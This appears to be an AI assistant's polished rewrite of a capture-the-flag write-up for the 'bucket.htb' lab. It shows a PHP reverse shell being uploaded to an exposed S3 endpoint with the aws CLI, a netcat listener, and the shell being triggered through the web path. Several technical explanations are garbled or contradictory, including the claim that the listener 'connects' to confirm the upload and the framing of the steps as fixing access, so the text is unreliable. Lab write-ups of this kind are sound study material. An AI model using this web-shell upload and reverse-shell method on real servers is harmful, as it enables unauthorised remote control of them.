Here is a polished and structured version of your writeup, preserving all the key steps and findings while improving readability and flow:

---

## Writeup: Exploiting a Web Server Bucket via S3 Endpoint

### Objective
Exploit a web server bucket that hosts images via a subdomain (`adserver`), allowing access through an S3 endpoint URL instead of the root domain.

### Key Observations
- The main website lives under `s3://bucket.htb/adserver/`, while files are accessible via `http://bucket.htb/adserver/`.
- A PHP reverse shell was present at `/usr/share/webshells/php/php-reverse-shell.php`.
- Attempts to access the shell directly from the root domain (`bucket.htb/`) failed due to security restrictions.

### Steps to Fix Access

1. **List bucket contents**  
   ```bash
   aws s3 ls adserver
   ```
   Revealed that files are not accessible via `http://bucket.htb/adserver/` but only through the S3 endpoint.

2. **Upload a web shell to the subdomain**  
   Use the following command:
   ```bash
   aws s3 cp phprs.php s3://adserver/ --endpoint-url http://s3.bucket.htb
   ```
   The upload succeeds with `upload: ./phprs.php to s3://adserver/phprs.php`.

3. **Test the shell via netcat**  
   ```bash
   nc -lnvp 9001
   ```
   The listener starts and connects to `10.10.14.65`, confirming successful upload.

4. **Access the shell**  
   Visit `http://s3.bucket.htb/adserver/phprs.php` or `http://bucket.htb/adserver/phprs.php`.

### Why This Works
- The web server’s file system is mapped to S3 endpoints, so files are served under `s3://<bucket>/<subdomain>`.
- The PHP reverse shell is accessible through the subdomain path, bypassing direct root domain access.

### Conclusion
By uploading a web shell to `s3://adserver/` via `--endpoint-url`, we gain remote access to the main website, enabling further exploitation or control of the server.

---

This structure makes it easy for others to follow your investigation and understand the technical approach used.
